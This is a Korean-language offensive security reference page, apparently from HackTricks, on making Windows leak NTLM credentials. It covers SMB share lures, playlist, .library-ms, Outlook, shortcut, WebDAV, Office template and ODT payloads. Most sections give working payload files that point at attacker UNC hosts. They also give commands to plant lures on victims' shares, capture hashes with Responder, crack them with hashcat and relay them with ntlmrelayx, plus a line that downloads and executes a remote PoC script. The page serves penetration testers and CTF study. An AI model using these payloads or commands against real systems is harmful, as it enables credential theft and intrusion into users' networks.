# NTLM 자격 증명을 탈취할 수 있는 위치

{{#include ../../banners/hacktricks-training.md}}

**온라인에서 Microsoft Word 파일을 다운로드하는 것부터 NTLM leak의 출처인 https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md, 그리고 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)까지, [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)의 유용한 아이디어를 모두 확인하세요.**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### 쓰기 가능한 SMB 공유 + Explorer를 트리거하는 UNC 미끼 (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

**사용자나 예약된 작업이 Explorer에서 탐색하는 공유에 쓸 수 있다면**, 메타데이터가 공격자의 UNC(예: `\\ATTACKER\share`)를 가리키는 파일을 놓으세요. 폴더를 표시하면 **암묵적 SMB 인증**이 트리거되어 listener에 **NetNTLMv2**가 유출됩니다.<sup>[[1]](#references)</sup>

1. **미끼 생성** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF 등 지원)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **쓰기 가능한 공유 폴더에 파일을 넣어두세요** (피해자가 여는 모든 폴더):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **수신 및 crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows는 한 번에 여러 파일을 처리할 수 있습니다. Explorer가 미리 보기하는 항목은(`BROWSE TO FOLDER`) 클릭할 필요가 없습니다.

### Windows Media Player 재생 목록(.ASX/.WAX)

대상에게 사용자가 제어하는 Windows Media Player 재생 목록을 열거나 미리 보게 할 수 있다면, 항목이 UNC 경로를 가리키도록 설정해 Net-NTLMv2를 leak할 수 있습니다. WMP는 SMB를 통해 참조된 미디어를 가져오려고 시도하며, 이때 자동으로 인증합니다.<sup>[[3]](#references)[[4]](#references)</sup>

예시 페이로드:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

수집 및 크래킹 흐름:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP에 삽입된 .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer는 ZIP 아카이브 내부에서 직접 연 .library-ms 파일을 안전하지 않게 처리합니다. 라이브러리 정의가 원격 UNC 경로(예: \\attacker\share)를 가리키면, ZIP 내부의 .library-ms를 탐색하거나 실행하는 것만으로도 Explorer가 UNC 경로를 열거하고 공격자에게 NTLM 인증을 전송합니다. 이렇게 얻은 NetNTLMv2는 오프라인에서 크랙하거나 잠재적으로 relay할 수 있습니다.<sup>[[2]](#references)</sup>

공격자 UNC 경로를 가리키는 최소 .library-ms

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

운영 단계
- 위 XML을 사용해 .library-ms 파일을 만듭니다(IP/호스트 이름을 설정).
- 파일을 ZIP으로 압축합니다(Windows: 보내기 → 압축(zip) 폴더). ZIP 파일을 대상에게 전달합니다.
- NTLM capture listener를 실행하고, 피해자가 ZIP 파일 내부의 .library-ms 파일을 열 때까지 기다립니다.


### Outlook 일정 미리 알림 사운드 경로 (CVE-2023-23397) – zero‑click Net-NTLMv2 leak

Microsoft Outlook for Windows는 일정 항목의 확장 MAPI 속성인 PidLidReminderFileParameter를 처리했습니다. 이 속성이 UNC 경로(예: \\attacker\share\alert.wav)를 가리키면, 미리 알림이 실행될 때 Outlook이 SMB 공유에 연결해 사용자의 Net-NTLMv2를 leak했습니다. 이 문제는 2023년 3월 14일에 패치되었지만, 레거시/미적용 시스템 환경과 과거 사고 대응 측면에서 여전히 매우 중요합니다.<sup>[[5]](#references)</sup>

PowerShell을 사용한 빠른 exploit(Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

리스너 측:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

메모
- 알림이 트리거될 때 피해자의 Windows용 Outlook이 실행 중이기만 하면 됩니다.
- 이 leak으로 오프라인 cracking 또는 relay에 사용할 수 있는 Net‑NTLMv2를 얻을 수 있습니다(pass-the-hash는 아님).

### .LNK/.URL 아이콘 기반 zero-click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 우회)

Windows Explorer는 바로 가기 아이콘을 자동으로 렌더링합니다. 최근 연구에 따르면 Microsoft가 UNC 아이콘 바로 가기에 대한 2025년 4월 패치를 배포한 이후에도, 바로 가기의 대상은 UNC 경로에 호스팅하고 아이콘은 로컬에 두면 클릭 없이 NTLM 인증을 트리거할 수 있었습니다(패치 우회에 CVE‑2025‑50154가 할당됨). 폴더를 보기만 해도 Explorer가 원격 대상에서 메타데이터를 가져오면서 공격자의 SMB 서버로 NTLM을 전송합니다.<sup>[[6]](#references)</sup>

최소 Internet Shortcut payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

PowerShell을 통한 프로그램 바로 가기 payload (.lnk):

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Delivery ideas
- Shortcut을 ZIP에 넣고 피해자가 ZIP을 탐색하도록 유도합니다.
- 피해자가 열어볼 쓰기 가능한 공유 폴더에 Shortcut을 둡니다.
- 같은 폴더에 다른 미끼 파일을 함께 넣어 Explorer가 항목을 미리 보기하도록 합니다.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows는 `.lnk` 메타데이터를 실행할 때뿐 아니라 **보기/미리 보기** 시에도 로드합니다(아이콘 렌더링). CVE‑2026‑25185는 **ExtraData** 블록으로 인해 셸이 아이콘 경로를 확인하고 **로드 중에** 파일시스템에 접근하는 파싱 경로를 보여줍니다. 경로가 원격 경로인 경우 이 과정에서 아웃바운드 NTLM이 전송됩니다.

주요 트리거 조건(`CShellLink::_LoadFromStream`에서 관찰됨):
- ExtraData에 **DARWIN_PROPS** (`0xa0000006`)를 포함합니다(아이콘 업데이트 루틴을 실행하는 조건).
- **TargetUnicode**가 채워진 **ICON_ENVIRONMENT_PROPS** (`0xa0000007`)를 포함합니다.
- 로더가 `TargetUnicode`의 환경 변수를 확장한 뒤 결과 경로에 `PathFileExistsW`를 호출합니다.

`TargetUnicode`가 UNC 경로(예: `\\attacker\share\icon.ico`)로 해석되면, Shortcut이 있는 폴더를 **보기만 해도** 아웃바운드 인증이 발생합니다. **인덱싱**과 **AV 스캔**에서도 같은 로드 경로가 트리거될 수 있어, 실용적인 no-click leak 공격 표면이 됩니다.<sup>[[7]](#references)</sup>

Windows GUI를 사용하지 않고도 이러한 구조를 생성하고 검사할 수 있는 연구 도구(parser/generator/UI)는 **LnkMeMaybe** 프로젝트에서 제공합니다.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

네이티브 **WebDAV client**를 악용하면 현재 로그온 세션이 임의의 **HTTP/WebDAV** 엔드포인트에 인증하도록 강제할 수 있습니다:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Why this is useful:
- **공격자가 제어하는 WebDAV server**를 상대로는 custom client를 배포하지 않고도 **HTTP를 통한 NTLM**을 유발할 수 있습니다.
- **내부 호스트**를 상대로는 수평 이동을 시작하기 전에 탈취한 자격 증명이 어디서 허용되는지 은밀하게 **검증**할 수 있습니다.<sup>[[9]](#references)</sup>
- **SMB egress가 필터링**되지만 **HTTP/WebDAV**에는 여전히 접근할 수 있는 경우, 이 명령은 좋은 대안입니다.

Operational notes:
- 소스 호스트에서 **WebClient** 서비스가 실행 중이어야 합니다.
- `rundll32.exe`는 `davclnt.dll`을 로드하고, Windows가 **현재 사용자의 자격 증명**을 사용해 WebDAV 인증을 처리하도록 합니다.<sup>[[10]](#references)</sup>
- 직접 제어하는 인프라를 지정하는 경우, 다음과 같은 NTLM을 인식하는 HTTP listener/relay를 사용하세요:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

탐지 관점에서, 여러 내부 시스템을 대상으로 `rundll32.exe davclnt.dll,DavSetCookie`를 반복 실행하는 것은 일반적인 사용자 행동이라기보다 **자격 증명 검증 / spray와 유사한 측면 이동 준비**의 강력한 신호입니다.<sup>[[9]](#references)[[11]](#references)</sup>

### WebDAV NTLM coercion을 위한 원격 알림 URI

애플리케이션이 원격으로 설정된 팝업 또는 웹 보기 주소를 역참조하는 경우, `file://` 주소를 사용하면 **문서를 열거나 실행 파일 페이로드를 사용하지 않고도** 아웃바운드 인증을 유도할 수 있습니다. AOMEI 사례에서는 1픽셀 크기의 알림이 원격 `DavWWWRoot` WebDAV 경로를 가리켰습니다. Windows는 해당 주소로 통합 인증을 시도해 NetNTLMv2 challenge-response를 노출했습니다. 트리거는 팝업 표시 여부가 아니라 URI 역참조였습니다. 다만 여전히 애플리케이션의 URI 처리기, [Windows WebClient 동작](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution), 아웃바운드 인증 정책에 따라 달라집니다.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

위의 command-based coercion과 달리, 이 진입점은 [software notification configuration](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger)을 제어해야 합니다. one-pixel window와 높은 우선순위는 눈에 띄지 않는 notification도 client가 URI를 역참조하게 만들 수 있음을 보여줍니다.<sup>[[16]](#references)</sup>

### Office 원격 템플릿 injection (.docx/.dotm)으로 NTLM 인증 유도

Office 문서는 외부 템플릿을 참조할 수 있습니다. 연결된 템플릿을 UNC 경로로 설정하면 문서를 열 때 SMB에 인증합니다.

최소한의 DOCX 관계 변경 사항 (word/ 내부):

1) word/settings.xml을 편집하고 연결된 템플릿 참조를 추가합니다:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) word/_rels/settings.xml.rels를 편집하고 rId1337이 자신의 UNC를 가리키도록 합니다:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) .docx로 다시 패키징해 전달합니다. SMB 캡처 리스너를 실행하고 파일이 열릴 때까지 기다립니다.

### SMB 인증을 위한 ODT 외부 객체

문서 업로드 경로에서 `.odt`는 허용하지만 대상이 Office `.docx` 파일을 열지 않는 경우, Office 템플릿 대신 OpenDocument 외부 객체를 사용합니다. Metasploit의 `auxiliary/fileformat/odt_badodt`는 아래와 같은 on-load `draw:object` 참조가 포함된 `content.xml`을 가진 ODT를 생성합니다. `LHOST`를 SMB 리스너로 설정하고, 허용된 workflow를 통해 ODT를 업로드한 뒤, 사용자나 문서 처리기가 파일을 열 때 발신되는 NetNTLMv2 응답을 캡처합니다. 파일명 확장자 검사는 이 URL이 삽입된 위치까지 검사하지 않으며, 대상의 인바운드 NTLM 제한이 아웃바운드 인증까지 반드시 차단하는 것은 아닙니다.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

NTLM을 relay하거나 악용하는 post-capture 아이디어는 다음을 확인하세요.

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – 쓰기 가능한 공유 폴더 유인 + Responder 캡처 → NetNTLMv2 crack → svc_mssql Kerberoast](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms 인증 leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16으로 DA 획득 (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → 웹 루트에 NTFS junction 생성해 RCE → FullPowers + GodPotato로 SYSTEM 획득](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – NTLM 취약점 5가지: Microsoft의 패치되지 않은 권한 상승 위협](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft, Outlook EoP (CVE‑2023‑23397) 완화 및 PidLidReminderFileParameter를 통한 NTLM leak 설명](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – zero-click, one NTLM: Microsoft 보안 패치 우회 (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 분석](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe 도구](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT 지원팀의 전화: Teams에서 도메인 침해까지 이어진 ModeloRAT 캠페인 분석](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h 헤더](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV 요청](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - NetNTLM hash 탈취 관심 지점](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — ODT 외부 객체를 이용한 NTLM 캡처](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group 및 Mandiant – 일시적인 공급망 변조 조사](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
